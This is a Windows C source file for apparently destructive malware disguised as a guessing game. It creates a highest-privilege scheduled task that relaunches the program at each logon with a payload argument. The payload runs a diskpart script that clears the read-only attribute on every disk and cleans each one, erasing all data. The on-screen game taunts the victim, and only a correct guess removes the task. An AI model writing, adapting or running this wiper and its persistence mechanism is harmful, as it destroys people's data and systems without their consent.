#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

void task_sch() {
    char exepath[MAX_PATH]; //finding current executable
    char cmd[MAX_PATH + 256]; // buffer for the rest of the code

    if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) {
        return;
    }
    sprintf(cmd, 
        "schtasks /create /sc onlogon /tn \"game\" /tr \"%s payload\" /rl highest /f", 
        exepath);
    system(cmd);
    
}
void game() {
    SetConsoleTitleA("Screen");

    srand(time(NULL));
    int key = (rand() % 10) + 1;
    int guess = 0;

    printf("=== Let's Play a little Game ===\n");
    printf("If you want your computer back...\n");
    printf("Then guess the number\n");
    
    int loser = 0;

    while (1) {
        printf("Enter guess 1-10 >:");
        fflush(stdout);

        scanf("%d", &guess);

        if (guess == key) {
            printf("\nYou Won!!! Woohoo\n");
            safe();
            break;
        } else {
            printf("Wrong :(");
        }
}}
void safe() {
    system("schtasks /delete /tn \"game\" /f");
}
void payload() {
    /*ShellExecute(0, "open", "cmd.exe",
                "/c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
                "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
                "echo select disk %a >> cl.txt & echo attributes disk clear readonly >> cl.txt & echo clean >> cl.txt) && "
                "diskpart /s cl.txt && del ld.txt && del lo.txt && del cl.txt",
                0, SW_HIDE);*/
    system(
        "cmd /c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
        "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
        "echo select disk %a >> cl.txt & echo attributes disk clear readonly >> cl.txt & echo clean >> cl.txt) && "
        "diskpart /s cl.txt && del ld.txt && del lo.txt && del cl.txt"
    );
}
int main(int argc, char *argv[]){
    if (argc > 1 && strcmp(argv[1], "payload") == 0) {
        payload();
        return 0;
    }
    task_sch();
    game();
}